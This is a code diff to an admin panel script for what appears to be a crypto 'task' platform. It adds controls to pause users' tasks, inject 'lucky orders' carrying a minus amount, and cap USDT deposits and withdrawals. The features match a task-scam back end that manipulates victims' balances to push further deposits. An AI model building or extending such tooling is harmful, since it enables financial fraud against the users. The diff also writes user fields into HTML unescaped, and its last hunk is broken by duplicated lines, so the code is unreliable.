@@ -161,14 +161,14 @@ async function loadDashboardStats() {
 }
 
 // -------------------------------------------------------------
-// 2. USERS MANAGEMENT (Create, Delete, Freeze, Adjust)
+// 2. USERS MANAGEMENT (Create, Delete, Freeze, Adjust, Start/Stop Tasks)
 // -------------------------------------------------------------
 async function loadUsersTable() {
   const data = await adminApi('/users');
   if (data.success) {
     const tbody = document.getElementById('admin-users-table-body');
     if (!data.users || data.users.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:24px; color:#94a3b8;">No registered users yet</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="9" style="text-align:center; padding:24px; color:#94a3b8;">No registered users yet</td></tr>`;
       return;
     }
 
@@ -188,7 +188,15 @@ async function loadUsersTable() {
         <td>
           <strong>${u.completed_tasks} / ${u.max_daily_tasks}</strong>
           <div style="font-size:11px; color:#38bdf8;">Max Profit: $${parseFloat(u.max_profit || 10).toFixed(2)}</div>
-          <button class="btn-sm btn-secondary-sm" style="margin-top:4px; font-size:11px;" onclick="openAdjustTasksModal(${u.id}, '${u.username}', ${u.completed_tasks}, ${u.max_daily_tasks}, ${u.max_profit || 10.00})">✏️ Tasks/Profit</button>
+          <button class="btn-sm btn-secondary-sm" style="margin-top:4px; font-size:11px;" onclick="openAdjustTasksModal(${u.id}, '${u.username}', ${u.completed_tasks}, ${u.max_daily_tasks}, ${u.max_profit || 10.00}, ${u.tasks_allowed})">✏️ Tasks/Profit</button>
+        </td>
+        <td>
+          <span class="badge-status ${u.tasks_allowed != 0 ? 'badge-active' : 'badge-suspended'}" style="font-size:11px;">
+            ${u.tasks_allowed != 0 ? '✓ Allowed' : '⏸ Paused'}
+          </span>
+          <button class="btn-sm ${u.tasks_allowed != 0 ? 'btn-danger-sm' : 'btn-success-sm'}" style="margin-top:4px; font-size:11px; display:block;" onclick="toggleUserTasks(${u.id})">
+            ${u.tasks_allowed != 0 ? '⏹ Pause Tasks' : '▶ Start Tasks'}
+          </button>
         </td>
         <td><code style="color:#ea580c; font-weight:700;">${u.invite_code}</code></td>
         <td>${u.invited_by ? `<code style="color:#94a3b8;">${u.invited_by}</code>` : '<span style="color:#64748b;">Direct</span>'}</td>
@@ -210,6 +218,17 @@ async function loadUsersTable() {
   }
 }
 
+// Toggle User Tasks Allowed (Start/Stop Tasks)
+window.toggleUserTasks = async function(id) {
+  const data = await adminApi(`/users/${id}/toggle-tasks`, { method: 'POST' });
+  if (data.success) {
+    alert(data.message);
+    loadUsersTable();
+  } else {
+    alert(data.message || 'Failed to toggle task permission.');
+  }
+};
+
 // Add User Modal
 window.openAddUserModal = function() {
   document.getElementById('modal-add-user').classList.add('active');
@@ -225,6 +244,7 @@ document.getElementById('form-create-user-modal').addEventListener('submit', asy
     max_profit: parseFloat(document.getElementById('newuser-maxprofit')?.value) || 10.00,
     vip_level: parseInt(document.getElementById('newuser-vip').value) || 1,
     withdrawal_pin: document.getElementById('newuser-pin').value || '123456',
+    tasks_allowed: parseInt(document.getElementById('newuser-tasks-allowed')?.value || 1),
     invite_code: document.getElementById('newuser-code').value.trim() || undefined,
     invited_by: document.getElementById('newuser-inviter').value.trim() || undefined
   };
@@ -299,13 +319,15 @@ document.getElementById('btn-confirm-adjust-bal').addEventListener('click', asyn
 });
 
 // Adjust Tasks & Max Profit Modal
-window.openAdjustTasksModal = function(id, username, completed, max, maxProfit) {
+window.openAdjustTasksModal = function(id, username, completed, max, maxProfit, tasksAllowed) {
   adminState.activeUserId = id;
   document.getElementById('task-modal-user').textContent = username;
   document.getElementById('task-modal-completed').value = completed;
   document.getElementById('task-modal-max').value = max;
   const profitEl = document.getElementById('task-modal-profit');
   if (profitEl) profitEl.value = (maxProfit !== undefined) ? maxProfit : 10.00;
+  const allowedEl = document.getElementById('task-modal-allowed');
+  if (allowedEl) allowedEl.value = (tasksAllowed !== undefined && tasksAllowed == 0) ? '0' : '1';
   const resetEl = document.getElementById('task-modal-reset-cycle');
   if (resetEl) resetEl.checked = false;
   document.getElementById('modal-adjust-tasks').classList.add('active');
@@ -315,6 +337,7 @@ document.getElementById('btn-confirm-adjust-tasks').addEventListener('click', as
   const completed = document.getElementById('task-modal-completed').value;
   const max = document.getElementById('task-modal-max').value;
   const profit = document.getElementById('task-modal-profit')?.value || 10.00;
+  const tasksAllowed = document.getElementById('task-modal-allowed')?.value || '1';
   const resetCycle = document.getElementById('task-modal-reset-cycle')?.checked || false;
 
   const data = await adminApi(`/users/${adminState.activeUserId}/update-tasks`, {
@@ -323,6 +346,7 @@ document.getElementById('btn-confirm-adjust-tasks').addEventListener('click', as
       completed_tasks: parseInt(completed) || 0, 
       max_daily_tasks: parseInt(max) || 60,
       max_profit: parseFloat(profit) || 10.00,
+      tasks_allowed: parseInt(tasksAllowed),
       reset_cycle_profit: resetCycle
     })
   });
@@ -455,6 +479,7 @@ async function loadLuckyOrdersTable() {
           <span style="color:#f59e0b; font-weight:600;">
             ${t.trigger_type === 'next' ? 'Next "Start Matching"' : `At Task #${t.target_task_number}`}
           </span>
+          ${parseFloat(t.minus_amount || 0) > 0 ? `<div style="font-size:11px; color:#ef4444; font-weight:700;">Minus: -${parseFloat(t.minus_amount).toFixed(2)} USDT</div>` : ''}
         </td>
         <td><strong style="color:#ea580c;">${parseFloat(t.amount).toFixed(2)} USDT</strong></td>
         <td><strong style="color:#10b981;">+${parseFloat(t.expected_return).toFixed(2)} USDT</strong></td>
@@ -478,6 +503,7 @@ document.getElementById('form-inject-lucky-order').addEventListener('submit', as
   const triggerType = document.getElementById('lucky-trigger-type').value;
   const targetTaskNum = document.getElementById('lucky-target-task-num').value;
   const amount = document.getElementById('lucky-amount-input').value;
+  const minusAmt = document.getElementById('lucky-minus-input')?.value || 0;
   const expectedReturn = document.getElementById('lucky-return-input').value;
   const prodName = document.getElementById('lucky-prod-name-input').value;
 
@@ -487,6 +513,7 @@ document.getElementById('form-inject-lucky-order').addEventListener('submit', as
       trigger_type: triggerType,
       target_task_number: targetTaskNum,
       amount: parseFloat(amount),
+      minus_amount: parseFloat(minusAmt) || 0,
       expected_return: parseFloat(expectedReturn),
       product_name: prodName
     })
@@ -744,7 +771,9 @@ async function loadSettingsForm() {
     document.getElementById('set-deposit-addr').value = data.settings.trc20_deposit_address || '';
     document.getElementById('set-daily-tasks').value = data.settings.default_daily_tasks || 60;
     document.getElementById('set-min-dep').value = data.settings.min_deposit || 20;
+    document.getElementById('set-max-dep').value = data.settings.max_deposit || 100000;
     document.getElementById('set-min-with').value = data.settings.min_withdraw || 30;
+    document.getElementById('set-max-with').value = data.settings.max_withdraw || 50000;
     document.getElementById('set-tg-url').value = data.settings.customer_service_url || '';
     document.getElementById('set-admin-path').value = data.settings.admin_secret_path || '/secret-admin-portal-xyz';
   }
@@ -757,7 +786,12 @@ document.getElementById('form-admin-settings').addEventListener('submit', async 
     trc20_deposit_address: document.getElementById('set-deposit-addr').value,
     default_daily_tasks: document.getElementById('set-daily-tasks').value,
     min_deposit: document.getElementById('set-min-dep').value,
+    max_deposit: document.getElementById('set-max-dep').value,
     min_withdraw: document.getElementById('set-min-with').value,
+    max_withdraw: document.getElementById('set-max-with').value,
+    customer_service_url: document.getElementById('set-tg-url').value,
+    admin_secret_path: document.getElementById('set-admin-path').value
+  };
     customer_service_url: document.getElementById('set-tg-url').value,
     admin_secret_path: document.getElementById('set-admin-path').value
   };
